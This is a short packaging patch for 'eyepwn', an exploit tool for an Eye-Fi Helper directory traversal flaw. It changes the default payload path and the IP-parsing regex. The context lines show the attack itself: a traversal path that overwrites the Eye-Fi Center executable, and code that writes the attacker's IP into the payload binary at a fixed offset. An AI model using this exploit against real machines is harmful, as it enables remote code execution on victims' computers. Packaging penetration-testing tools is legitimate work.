@@ -1,0 +1,34 @@
+--- eyepwn/eyepwn.py	2013-01-03 13:58:28.000000000 +0000
++++ eyepwn.py	2014-03-05 23:30:52.060115817 +0000
+@@ -1,3 +1,4 @@
++#!/usr/bin/env python2
+ """eyepwn - exploit for Eye-Fi Helper directory traversal vulnerability.
+ 
+ Copyright 2011, Paul Johnston, Pentest Ltd
+@@ -32,7 +33,7 @@
+ parser = optparse.OptionParser(usage="usage: %prog [options]")
+ parser.add_option("-e", dest="helper_ip", default=None,
+     help='IP address of Eye-Fi helper (autodiscovered if not specified)')
+-parser.add_option("-d", dest="payload", default='payload.exe',
++parser.add_option("-d", dest="payload", default='/usr/share/eyepwn/payload.exe',
+     help='Payload to use (default: %default)')
+ parser.add_option("-f", dest="new_sig", default='../../../../../../../../Program Files/Eye-Fi/Eye-Fi Center/Eye-Fi Center.exe',
+     help='File path to overwrite (default: Eye-Fi centre)')
+@@ -51,7 +52,7 @@
+     """Get IP address(es) of this machine."""
+     ips = []
+     for iface in os.popen('/sbin/ifconfig').read().split('\n\n'):
+-        m = re.search('^(\w+).*inet addr:(\S+)', iface, re.S)
++        m = re.search('^(\w+).*inet (\S+)', iface, re.S)
+         if m:
+             if not options.interface:
+                 options.interface = m.group(1)
+@@ -254,7 +255,7 @@
+     if not options.helper_ip:
+         options.helper_ip = find_helper(network)
+     
+-    if options.payload == 'payload.exe':
++    if options.payload == '/usr/share/eyepwn/payload.exe':
+         pl = open(options.payload, 'rb').read()
+         options.payload = pl[:0x23F] + socket.inet_aton(my_ips[0]) + pl[0x243:]
+     else:
